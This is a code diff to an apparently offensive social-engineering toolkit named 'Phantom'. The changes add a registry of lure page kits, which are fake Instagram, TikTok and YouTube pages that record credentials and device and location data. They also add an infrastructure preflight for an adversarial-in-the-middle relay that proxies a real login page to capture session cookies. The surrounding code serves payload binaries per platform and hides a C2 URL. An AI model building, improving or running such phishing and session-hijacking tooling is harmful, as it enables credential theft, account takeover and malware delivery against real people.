@@ -20,6 +20,9 @@ One workspace to build the delivery layer of a social engagement:
                       like it won't load, never exposes the C2 URL)
   craft hits <code>   every recorded hit / open / credential (+ device/geo)
   craft wait <code>   live-wait for the target
+  craft kits          the lure page KITS that exist, what each one needs
+                      and what it captures (tracker.skin is validated
+                      against this list, not by a branch order)
 
 Everything prints in "ready to paste" form. The tracker is Phantom's own
 local HTTP server (no third party), the same one the auto-mode uses.
@@ -33,6 +36,7 @@ import urllib.parse
 import uuid
 from typing import Any, Dict, List, Optional
 
+from phantom.automation.social import infra, kits
 from phantom.automation.social.grabbit import GrabLink, IpGrabber
 from phantom.automation.social.tracker import (
     HitStore, VictimHit, OpenEvent, CredCapture,
@@ -685,9 +689,18 @@ def craft_beacon_player(platform: str = "auto",
     # serves the matching binary; pinned: pass a single URL.
     payload_urls = urls if auto else {platform: urls.get(platform, urls["windows"])}
     payload_url = urls.get(platform, urls["windows"]) if not auto else urls["windows"]
-    skin = (skin or "instagram").lower()
-    if skin not in ("instagram", "tiktok", "youtube"):
-        skin = "instagram"
+    # An unknown skin used to fall back to instagram SILENTLY — the operator
+    # believed they had picked a kit they had not (see kits.py). The fallback
+    # is unchanged because this command has its own default; it is just said
+    # out loud now.
+    requested = (skin or "instagram").strip().lower()
+    if requested not in kits.kit_ids():
+        if requested:
+            notifier.warn(
+                f"unknown skin '{requested}': rendering 'instagram'. "
+                f"Valid kits: {', '.join(kits.kit_ids())}")
+        requested = "instagram"
+    skin = requested
     try:
         link = _grabber().create_player_link(
             label="player", platform=skin, video=None,
@@ -804,7 +817,39 @@ def craft_beacon(platform: str = "auto") -> Dict[str, Any]:
     }
 
 
-# ── waiting / results ───────────────────────────────────────────────────────
+# ── kit registry / waiting / results ───────────────────────────────────────
+
+def craft_kits() -> Dict[str, Any]:
+    """The lure page KITS that exist, with what each one needs and captures.
+
+    `tracker.skin` was a free-form string validated only by a branch order in
+    the renderer, so a typo rendered a DIFFERENT kit with no warning. This is
+    the list an operator can check against, and the list `tracker.py` now
+    resolves against.
+    """
+    rows = kits.kit_rows()
+    notifier.info(f"Lure page kits (config key: tracker.skin, "
+                  f"default {kits.DEFAULT_KIT}):")
+    for kit_id, label, channel, _notes in rows:
+        notifier.info(f"  {kit_id:<10} {label}  [{channel}]")
+    for kit in kits.KITS:
+        notifier.info(f"  {kit.id}: {kit.captures}")
+        if kit.notes:
+            notifier.info(f"    {kit.notes}")
+    return {
+        "kind": "kits",
+        "default": kits.DEFAULT_KIT,
+        "config_key": "tracker.skin",
+        "valid": list(kits.kit_ids()),
+        "rows": [list(row) for row in rows],
+        "kits": [
+            {"id": kit.id, "label": kit.label, "channel": kit.channel,
+             "needs_video_id": kit.needs_video_id, "captures": kit.captures,
+             "notes": kit.notes}
+            for kit in kits.KITS
+        ],
+    }
+
 
 def craft_aitm(upstream: str = "", code: str = "") -> Dict[str, Any]:
     """Mount an adversarial-in-the-middle relay for a REAL login page.
@@ -837,12 +882,46 @@ def craft_aitm(upstream: str = "", code: str = "") -> Dict[str, Any]:
                      "that service."),
             "requires": ["domain+tls", "authorization"],
         }
+    # INFRASTRUCTURE PREFLIGHT before anything is mounted. Every failure it
+    # reports is a SILENT one (a lure on a LAN address, a relay whose session
+    # cookie is dropped for lack of TLS), and the operator should read them
+    # now rather than infer them later from "no sessions captured".
+    #
+    # The URL judged is the one the relay will ACTUALLY use (`_tracking_base`,
+    # not the raw config key), and DNS is skipped here: this runs inside an
+    # interactive command, and an unreachable resolver must not decide whether
+    # a mount succeeds. `infra_preflight(resolve=True)` keeps that check for
+    # callers that ask for it.
+    try:
+        base = _tracking_base()
+    except Exception as e:
+        return {"error": f"Tracker unavailable: {e}"}
+    report = infra.infra_preflight(public_url=base, aitm=True, resolve=False)
+    notifier.info(report.render())
+    for check in report.checks:
+        line = f"{check.code}: {check.detail}"
+        if check.severity == infra.BLOCKER:
+            notifier.error(line, hint=check.remedy)
+        elif check.severity == infra.WARNING:
+            notifier.warn(line)
+        else:
+            notifier.info(line)
+    if report.blockers:
+        return {
+            "error": "AiTM relay refused: the lure infrastructure is not "
+                     "ready.",
+            "hint": report.top_remedy() or "resolve the reported blockers",
+            "blockers": report.codes(infra.BLOCKER),
+            "marker": report.render(),
+            "checks": [{"code": c.code, "severity": c.severity,
+                        "detail": c.detail, "remedy": c.remedy}
+                       for c in report.checks],
+        }
     try:
         server = _server()
     except Exception as e:
         return {"error": f"Tracker unavailable: {e}"}
     code = code or f"aitm-{uuid.uuid4().hex[:8]}"
-    base = _tracking_base()
     mount = f"{base}/a/{code}"
     try:
         server.register_aitm(code, upstream)
